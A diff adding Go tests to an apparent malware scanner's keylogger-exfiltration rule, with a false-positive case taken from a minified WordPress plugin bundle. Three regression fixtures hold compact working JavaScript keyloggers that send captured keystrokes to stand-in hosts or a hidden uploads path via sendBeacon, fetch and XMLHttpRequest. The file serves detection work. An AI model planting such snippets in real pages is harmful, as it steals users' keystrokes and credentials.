@@ -56,6 +56,46 @@ func TestKeyloggerYAML_CredentialFieldExfilStillDetected(t *testing.T) {
 	}
 }
 
+// smushBundleShape is excerpted verbatim from WP Smush's minified
+// smush-tutorials.min.js, the 2026-08-07 false positive: an Enter-key
+// COMPARISON ((e.which||e.keyCode)===ct.KeyCode.RETURN) ~265 chars before an
+// unrelated media fetch. Comparisons never store the keystroke.
+const smushBundleShape = `-href"),"_blank")})),Ge(Je(t),"handleKeydown",(function(e){if((e.which||e.keyCode)===ct.KeyCode.RETURN)t.openLink(e)})),t.state={media:[],error:null,isLoaded:!1},t.openLink=t.openLink.bind(Je(t)),t.handleKeydown=t.handleKeydown.bind(Je(t)),t}return n=i,(r=[{key:"componentDidMount",value:function(){var e=this,t=this.props.media;fetch("https://wpmudev.com/blog/wp-json/wp/v2/media/"+t).then((function(e){return e.json()})).then((function(t){e.setState({isLoaded:!0,media:t.guid.rendered})}),(function(t){e.setState({isLoaded:!0,error:t})}))}},{key:"render",value:function(){var t=this.state,n=t.media,r=t.error,a=t.isLoaded` +
+	`,translate:[{read_article:u,min_read:s}],onClick:function(e){return t.openLink(e)},onKeyDown:function(e){return t.handleKeydown(e)}}))}));return a?e.createElement(Ke,{type:"error"`
+
+func TestKeyloggerYAML_SmushTutorialsBundle(t *testing.T) {
+	scanner := loadRepoScanner(t)
+	if hasRule(scanner.ScanContent([]byte(smushBundleShape), ".js"), "exfil_keylogger_js") {
+		t.Error("exfil_keylogger_js FP: matched Smush bundle (Enter-key comparison + unrelated media fetch)")
+	}
+}
+
+func TestKeyloggerYAML_PushedKeystrokeBufferStillDetected(t *testing.T) {
+	scanner := loadRepoScanner(t)
+	mal := []byte(`var q=[];window.addEventListener("keyup",function(e){q.push(e.key);` +
+		`if(q.length>=32){navigator.sendBeacon("/wp-content/uploads/.cache/l.php",q.join(""));q=[]}});`)
+	if !hasRule(scanner.ScanContent(mal, ".js"), "exfil_keylogger_js") {
+		t.Error("exfil_keylogger_js regression: pushed keystroke buffer not detected")
+	}
+}
+
+func TestKeyloggerYAML_TemplateLiteralKeystrokeStillDetected(t *testing.T) {
+	scanner := loadRepoScanner(t)
+	mal := []byte("addEventListener(\"keydown\",e=>{fetch(`https://t.example.invalid/k?v=${e.key}&u=${location.href}`,{mode:\"no-cors\"})});")
+	if !hasRule(scanner.ScanContent(mal, ".js"), "exfil_keylogger_js") {
+		t.Error("exfil_keylogger_js regression: template-literal keystroke exfil not detected")
+	}
+}
+
+func TestKeyloggerYAML_SinkBeforeCaptureStillDetected(t *testing.T) {
+	scanner := loadRepoScanner(t)
+	mal := []byte(`function ship(d){var x=new XMLHttpRequest;x.open("POST","//log.example.invalid/i");x.send(d)}` +
+		`var log="";document.onkeydown=function(e){log+=String.fromCharCode(e.keyCode);if(log.length>64){ship(log);log=""}};`)
+	if !hasRule(scanner.ScanContent(mal, ".js"), "exfil_keylogger_js") {
+		t.Error("exfil_keylogger_js regression: sink-before-capture buffered keylogger not detected")
+	}
+}
+
 // Go-fallback parity for the replacement HTML-smuggling rule. The suppressed
 // Forge rule fired without any smuggled payload; this one must not.
 func TestHTMLSmugglingYAML_BenignDownloadBundle(t *testing.T) {
